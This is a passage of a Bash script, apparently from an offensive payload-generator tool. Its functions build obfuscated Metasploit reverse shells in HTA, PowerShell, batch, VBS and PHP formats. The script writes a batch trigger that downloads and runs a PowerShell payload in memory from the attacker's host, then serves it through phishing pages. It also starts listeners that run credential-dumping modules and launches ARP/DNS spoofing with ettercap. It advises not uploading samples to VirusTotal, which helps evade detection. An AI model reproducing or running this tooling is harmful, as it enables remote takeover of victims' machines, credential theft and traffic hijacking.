        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# -----------------------------------------------------
# build shellcode in HTA-PSH format (windows-platforms)
# reproduction of hta powershell attack in unicorn.py
# one of my favorite methods by ReL1K :D 
# -----------------------------------------------------
sh_shellcode9 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> PSH language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
echo "[☠ ] obfuscating -> base64 encoded!"
sleep 2
store=`cat $IPATH/output/chars.raw | awk {'print $7'}`
echo $store
echo "" && echo ""
# grab shellcode from chars.raw
Sh33L=`cat $IPATH/output/chars.raw | grep "powershell.exe -nop -w hidden -e" | cut -d '"' -f2`
# copy chars.raw to hta_attack dir
cp $IPATH/output/chars.raw $IPATH/templates/hta_attack/chars.raw
sleep 2


   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc6 ]; then
      echo "[☠ ] exec.hta -> found!"
      sleep 2
   else
      echo "[☠ ] exec.hta -> not found!"
      exit
   fi

   if [ -e $InJEc7 ]; then
      echo "[☠ ] index.html -> found!"
      sleep 2
   else
      echo "[☠ ] index.html -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Launcher.hta" --width 300) > /dev/null 2>&1
echo "[☠ ] editing/backup files..."
cp $InJEc6 $IPATH/templates/hta_attack/mine[bak].hta
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates/hta_attack
# use SED to replace NaM3 and Inj3C
echo "[☠ ] Injecting shellcode -> $N4m!"
# replace NaM3 by $N4m (var grab by venom.sh)
sed "s|NaM3|$N4m|g" index.html > copy.html
mv copy.html $IPATH/output/index.html
# replace INj3C by shellcode stored in var Sh33L in 'meu_hta-psh.hta' file
sed "s|Inj3C|$Sh33L|g" exec.hta > $N4m
mv $N4m $IPATH/output/$N4m


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n$IPATH/output/index.html\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store the 2 files in apache2 webroot and\nSend: [ http://$lhost/index.html ]\nto target machine to execute payload" --info > /dev/null 2>&1
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      cp index.html $ApAcHe/index.html > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/hta_attack/mine[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
rm $IPATH/templates/hta_attack/chars.raw > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# --------------------------------------------------------------
# build shellcode in PS1 (windows systems)
# 'Matthew Graeber' powershell <DownloadString> technic
# --------------------------------------------------------------
sh_shellcode10 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode.ps1" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> psh-cmd language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw" > /dev/null 2>&1
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "$str0" > $IPATH/output/chars.raw


# display shellcode
echo ""
echo "[☠ ] obfuscating -> base64 encoded!"
sleep 3
echo $str0
echo "" && echo ""

# EDITING/BACKUP FILES NEEDED
echo "[☠ ] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi



cd $IPATH/output/
# compiling to ps1 output format
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
sed "s|Sh33L|$str0|" payload.raw > $N4m
rm $IPATH/output/payload.raw > /dev/null 2>&1


# build trigger.bat (x86) to call .ps1
echo "[☠ ] Building ps1 -> trigger.bat..."
sleep 2
echo ":: powershell template | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: Matthew Graeber - DownloadString" >> $IPATH/output/trigger.bat
echo ":: Download/execute payload in RAM" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m')" >> $IPATH/output/trigger.bat



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n$IPATH/output/trigger.bat\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1
   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store $N4m in apache2 webroot and\nexecute trigger.bat on target machine" --info > /dev/null 2>&1
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|trigger.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      cp trigger.bat $ApAcHe/trigger.bat > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ----------------------------------------------------
# build shellcode in PSH-CMD (windows BAT) ReL1K :D 
# reproduction of powershell.bat payload in unicorn.py
# ----------------------------------------------------
sh_shellcode11 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode.bat" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> psh-cmd language..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`

# display shellcode
echo ""
echo "[☠ ] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠ ] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠ ] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠ ] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name
cd $IPATH/output/
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
echo ":: powershell bat template | Author: r00t-3xp10it" > $N4m
echo ":: unicorn - reproduction (base64 encoded)" >> $N4m
echo ":: ---" >> $N4m
echo "@echo off" >> $N4m
echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m
chmod +x $IPATH/output/$N4m


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠ ] Start a multi-handler..."
      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯ ] Please dont test samples on virus total..."
xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"

        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# --------------------------------------------------------
# build shellcode in VBS (obfuscated using ANCII) 
# It was Working in 'Suryia Prakash' rat.vbs obfuscation
# that led me here... (build a vbs obfuscated payload) :D
# --------------------------------------------------------
sh_shellcode12 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --title="☠ VBS NAME ☠" --text "example: shellcode.vbs" --entry --width 330) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1

echo "[☠ ] Building shellcode -> vbs language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i 9 -f vbs > $IPATH/obfuscate/$N4m" > /dev/null 2>&1
echo "[☠ ] encoded -> shikata_ga_nai"
sleep 2
cat $IPATH/obfuscate/$N4m | grep '"' | awk {'print $3'} | cut -d '=' -f2
# obfuscating payload.vbs
echo "[☠ ] Obfuscating sourcecode..."
sleep 2
cd $IPATH/obfuscate/
xterm -T "☠ VBS-OBFUSCATOR.PY ☠" -geometry 110x23 -e "python vbs-obfuscator.py $N4m final.vbs"
cp final.vbs $IPATH/output/$N4m > /dev/null 2>&1
rm $N4m > /dev/null 2>&1
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
cd $IPATH/

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 180) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠ ] Start a multi-handler..."
     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯ ] Please dont test samples on virus total..."
     xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

   else

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"

        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
cd $IPATH/
}






# ------------------------------------------------------
# build shellcode in PHP (webserver stager)
# php/meterpreter raw format OR php/base64 format
# Thanks to my friend 'egypt7' from rapid7 for this one
# interactive kali-apache2 php exploit (by me)
# ------------------------------------------------------
sh_shellcode13 () {
# get user input to build shellcode
echo "[☠ ] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: shellcode.php" --entry --width 330) > /dev/null 2>&1


# CHOSE WHAT PAYLOAD TO USE
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nWARNING: this payload only works againt webservers\n\n'Unix Apache2 Exploit' Its my atemp to exploit unix OS\nwith apache2 installed using one php (base64) payload.\ntrigger.sh its deliver to target and when pressed it will\ndownload the php payload to target apache webroot\nand triggers its execution (perfect againts kali distro)\n\nAvailable payloads:" --radiolist --column "Pick" --column "Option" TRUE "php/meterpreter (default)" FALSE "php/meterpreter (base64)" FALSE "Unix Apache2 Exploit (base64)" --width 380 --height 350) > /dev/null 2>&1


if [ "$serv" = "php/meterpreter (default)" ]; then
echo "[☠ ] Building shellcode -> php language..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
|_PAYLOAD : php/meterpreter/reverse_tcp

!

# use metasploit to build shellcode
xterm -T "☠ SHELLCODE GENERATOR ☠" -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/$N4m"

echo ""
echo "[☠ ] building raw shellcode..."
sleep 2
echo "[☠ ] Injecting shellcode -> $N4m!"
sleep 2
# delete bad chars in php payload
echo "[☠ ] deleting webshell.php junk..."
sleep 2
cd $IPATH/output
sed "s/\///" $N4m > web2.php
sed "s|*||" web2.php > $N4m
rm $IPATH/output/web2.php > /dev/null 2>&1



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STORED UNDER:\n$IPATH/output/$N4m\n\nCopy webshell to target website and\nvisite the URL to get a meterpreter session\nExample: http://$lhost/$N4m\n\nOr use apache2 attack vector to deliver $N4m to target (trigger download)\n\nChose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 370 --height 330) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠ ] Start a multi-handler..."
     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯ ] Please dont test samples on virus total..."
     xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"

   else

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
      echo "[☠ ] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "yes" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"

        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠ ] Start a multi-handler..."
        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯ ] Please dont test samples on virus total..."
        xterm -T "☠ PAYLOAD MULTI-HANDLER ☠" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"

        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠ ] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m > /dev/null 2>&1
clear
cd $IPATH/



